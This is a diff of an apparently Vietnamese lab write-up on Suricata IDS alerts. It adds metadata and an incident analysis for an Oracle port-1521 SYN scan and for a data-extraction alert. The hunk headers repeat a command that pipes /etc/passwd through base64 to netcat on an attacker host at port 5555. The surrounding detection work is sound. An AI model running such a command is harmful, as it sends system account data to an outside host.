@@ -140,12 +140,24 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
 #### Log của hành vi quét cổng
 
 ```
-{ [-]
-   alert: { [-]
+{ 
+   alert: { 
      action: allowed
      category: Potentially Bad Traffic
      gid: 1
-     metadata: { [+]
+     metadata: {
+       confidence: [ 
+         Medium
+       ]
+       created_at: [ 
+         2010_07_30
+       ]
+       signature_severity: [
+         Informational
+       ]
+       updated_at: [
+         2019_07_26
+       ] 
      }
      rev: 3
      severity: 2
@@ -156,7 +168,7 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
    dest_port: 1521
    direction: to_server
    event_type: alert
-   flow: { [-]
+   flow: { 
      bytes_toclient: 0
      bytes_toserver: 60
      dest_ip: 192.168.0.20
@@ -182,16 +194,99 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
     source = /var/log/suricata/eve.json
     sourcetype = suricata
 ```
+1. Thời gian sự kiện:
 
-#### Log của hành vi trích xuất thông tin nhạy cảm
+UTC 2026-03-02 16:28:23
+(Timestamp gốc: 2026-03-02T23:28:23.155291+0700)
+
+2. Giao diện mạng:
+
+ens33
+
+3. Hệ thống liên quan
+
+- Nguồn (attacker): 192.168.0.30:47182
+- Đích (server): 192.168.0.20:1521
+- Giao thức: TCP
+
+4. Loại sự kiện:
+
+Cảnh báo Suricata – Hành vi do thám dịch vụ cơ sở dữ liệu (Service Scanning / Reconnaissance)
+
+5. Mô tả sự kiện:
+
+Hệ thống IDS Suricata đã ghi nhận một cảnh báo liên quan đến hành vi quét cổng nhắm vào dịch vụ cơ sở dữ liệu Oracle.
+
+Lưu lượng từ địa chỉ 192.168.0.30 đã gửi một gói TCP SYN đến cổng 1521 của máy 192.168.0.20. Đây là cổng mặc định của Oracle Database.
+
+Alert được kích hoạt bởi rule của Emerging Threats:
+
+Chữ ký phát hiện: ET SCAN Suspicious inbound to Oracle SQL port 1521
+
+Signature ID: 2010936
+
+Hành động: allowed (gói tin được cho phép đi qua – IDS mode)
+
+Danh mục: Potentially Bad Traffic
+
+Mức độ nghiêm trọng: 2 (Medium)
+
+Rule này được thiết kế để phát hiện các hành vi probing hoặc service enumeration nhắm vào cổng cơ sở dữ liệu nhạy cảm.
+
+6. Thông tin về lưu lượng
+
+Gói từ attacker đến server: 1 gói / 60 bytes
+
+Gói từ server đến attacker: 0 gói / 0 bytes
+
+Thời gian bắt đầu flow: 2026-03-02T23:28:23.155291+0700
+
+Direction: to_server
+
+Flow ID: 2074347087003202
+
+Phân tích cho thấy chỉ có một gói TCP SYN được gửi đi và không có phản hồi từ phía server. Hành vi này phù hợp với kỹ thuật SYN scan (nmap -sS), thường được sử dụng trong giai đoạn trinh sát hệ thống.
+
+
+### Log của hành vi trích xuất thông tin nhạy cảm
 
 ```
-{ [-]
-   alert: { [-]
+{ 
+   alert: { 
      action: allowed
      category: Attempted User Privilege Gain
      gid: 1
-     metadata: { [+]
+     metadata: { 
+       attack_target: [ 
+         Web_Server
+       ]
+       confidence: [
+         High
+       ]
+       created_at: [ 
+         2018_07_09
+       ]
+       deployment: [
+         Datacenter
+       ]
+       mitre_tactic_id: [
+         TA0001
+       ]
+       mitre_tactic_name: [
+         Initial_Access
+       ]
+       mitre_technique_id: [ 
+         T1190
+       ]
+       mitre_technique_name: [ 
+         Exploit_Public_Facing_Application
+       ]
+       signature_severity: [ 
+         Major
+       ]
+       updated_at: [ 
+         2019_07_26
+       ]
      }
      rev: 2
      severity: 1
@@ -202,7 +297,7 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
    dest_port: 5555
    direction: to_server
    event_type: alert
-   flow: { [-]
+   flow: {
      bytes_toclient: 140
      bytes_toserver: 5373
      dest_ip: 192.168.0.30
